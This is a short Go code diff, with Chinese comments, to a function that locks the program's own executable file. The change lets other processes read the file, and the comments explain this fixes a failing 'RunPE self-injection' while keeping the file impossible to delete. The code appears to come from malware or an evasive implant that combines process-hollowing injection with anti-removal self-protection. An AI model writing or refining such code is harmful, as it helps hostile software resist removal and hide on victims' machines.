@@ -25,12 +25,13 @@ func LockSelfFile() error {
 	}
 
 	// 3. 调用底层 CreateFile 锁定文件
-	// 核心防御点：ShareMode 设置为 0 (FILE_SHARE_NONE)
-	// 这意味着拒绝其他任何进程对该文件发起读、写、删除的共享请求
+	// 🌟 核心修复点：将 ShareMode 改为 FILE_SHARE_READ (值为 1)
+	// 这意味着：允许读取(修复 RunPE 自身注入失败的 Bug)
+	// 但依然拒绝其他任何进程对该文件发起写、删除的共享请求 (完美保留防删功能)
 	handle, err := syscall.CreateFile(
 		pathPtr,
-		syscall.GENERIC_READ, // 仅要求读权限
-		0,                    // FILE_SHARE_NONE (绝对独占)
+		syscall.GENERIC_READ,    // 仅要求读权限
+		syscall.FILE_SHARE_READ, // 允许读，拒绝写和删
 		nil,
 		syscall.OPEN_EXISTING,
 		syscall.FILE_ATTRIBUTE_NORMAL,
